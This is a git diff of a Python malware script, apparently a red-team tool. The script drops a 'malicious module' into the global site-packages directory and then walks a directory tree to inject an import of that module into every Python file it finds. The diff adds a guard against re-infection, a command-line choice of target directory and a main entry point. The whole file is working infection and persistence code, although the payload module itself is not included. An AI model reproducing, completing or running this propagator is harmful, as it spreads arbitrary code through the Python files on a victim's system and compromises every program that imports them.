@@ -1,26 +1,36 @@
 """
 Iterate through the file system and inject code into all python files
 @author: degenerat3
-disclaimer: this doesn't fkn work
 """
+
 
 import os
 import re
 import site
+import sys
 
-MODULE_CODE = "beacon.py"           # The malicious module source code file
-DEST_MODULE_NAME = "changeme"       # The name of the module that will get dropped into /usr/lib/...
-EXCLUDE_LIST = ["/path/to/yum.py", "/path/to/dnf.py" ]  # A comprehensive list of files we won't infect
+MODULE_CODE = "changeme"           # The malicious module source code file
+DEST_MODULE_NAME = "changeme"       # The name of the module that will get dropped into sitepkg
+EXCLUDE_LIST = ["/path/to/yum.py", "/path/to/dnf.py" ]  # A list of files we won't infect
 
 
 def get_pkg_dir():
-    arr = site.getsitepackages()
+    """
+    Find the correct directory for default packages
+    @return: The path of the python site packages
+    """
+    arr = site.getsitepackages()    # This function is lit
     for item in arr:
-        if "/usr/lib" in item:
+        if "/usr/lib" in item:      # we want the global one, not /usr/local/
             return item
 
 
-def read_beacon_code(filename):
+def read_module_code(filename):
+    """
+    Read the source code for the malicious module into a string
+    @param filename: the file holding the src code
+    @return: a string containing the code
+    """
     # TODO: Extract the code from the zipfile here
     
     # Until then, just read from the file directly
@@ -36,7 +46,7 @@ def drop_module(dest_file_path):
     @return: none
     """
     global MODULE_CODE
-    mod_code = read_beacon_code(MODULE_CODE)
+    mod_code = read_module_code(MODULE_CODE)
     with open(dest_file_path, "w") as f:
         f.write(mod_code)
     return
@@ -50,11 +60,11 @@ def find_py(pth):
     """
     global EXCLUDE_LIST
     py_files = []
-    for subdir, dirs, files in os.walk(pth):
+    for subdir, dirs, files in os.walk(pth):        # iterate through everything
         for fil in files:
             fname = os.path.join(subdir, fil)
-            if ".py" in fname:
-                if fname not in EXCLUDE_LIST:
+            if ".py" in fname:                      # if it's python
+                if fname not in EXCLUDE_LIST:       # if it's not on our ignore list
                     py_files.append(fname)
 
     return py_files
@@ -69,30 +79,50 @@ def infect_file(file_path):
     global DEST_MODULE_NAME
     old_content = ""
     with open(file_path, "r") as f:
-        old_content = f.read()
+        old_content = f.read()      # read the contents of the file into a string
+    
+    if DEST_MODULE_NAME in old_content:
+        return      # return if it's already infected
 
-    res = re.search('import(.+?)\n', old_content)
-    if res:
+    res = re.search('import(.+?)\n', old_content)   # find the first import line
+    if res:     
         current_imp = res.group(1)
-        print("EXISTING IMPORT: " + current_imp)
-        new_imp = current_imp + "import " + DEST_MODULE_NAME + "\n"
-        print("NEW IMPORT: " + new_imp)
-        new_con = old_content.replace(current_imp, new_imp)
+        # make a new import block that has our module
+        new_imp = current_imp + "\nimport " + DEST_MODULE_NAME[:-3]     
+        new_con = old_content.replace(current_imp, new_imp)     # insert the new import block
         with open(file_path, "w") as f:
-            f.write(new_con)
-    else:
+            f.write(new_con)    # write the new content
+
+    else:       # if there's no import block, just skip it, too much hassle
         return
 
 
-def infect():
+def infect(search_dir):
     """
-    The main function of the script; drops module and infects files
+    The work horse function of the script; drops module and infects files
+    @param search_dir: The directory to start the recursive search in
+    @return: none
     """
-    print("hacked")
-    mod_dest = get_pkg_dir() + "/" DEST_MODULE_NAME
-    drop_module(mod_dest)
-    py_files = find_py()
+    mod_dest = get_pkg_dir() + "/" + DEST_MODULE_NAME   # establish location for malicious module
+    drop_module(mod_dest)   # write the module
+    py_files = find_py(search_dir)  # find python
     for f in py_files:
-        infect_file(f)
+        print("Infecting " + f + "...")
+        infect_file(f)      # hack em
+    return
 
-infect()
+
+def main():
+    """
+    Take argument from cmdline (if present), pass into "infect'
+    """
+    argc = len(sys.argv)
+    if argc > 1:    # if they defined a directory, use it
+        infection_dir = sys.argv[1]
+    else:           # otherwise just use cwd
+        infection_dir = os.getcwd()
+    print("INFECTION DIR: " + infection_dir)
+    infect(infection_dir)
+
+
+main()
